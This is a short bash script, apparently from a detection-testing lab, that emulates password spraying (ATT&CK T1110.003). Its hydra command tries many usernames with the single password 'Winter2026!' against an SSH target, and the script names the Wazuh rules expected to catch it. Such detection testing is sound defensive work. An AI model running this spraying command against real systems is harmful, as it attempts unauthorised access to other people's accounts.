#!/bin/bash
# T1110.003 Password Spraying / T1087 account discovery: many usernames, one password.
# Expected detections: Wazuh 5710, lab rule 100101.
source "$(dirname "$0")/lib.sh"
step "Spraying common usernames against $TARGET"
hydra -L /attacks/wordlists/users.txt -p 'Winter2026!' -t 4 -W 1 -f "ssh://$TARGET_IP" || true
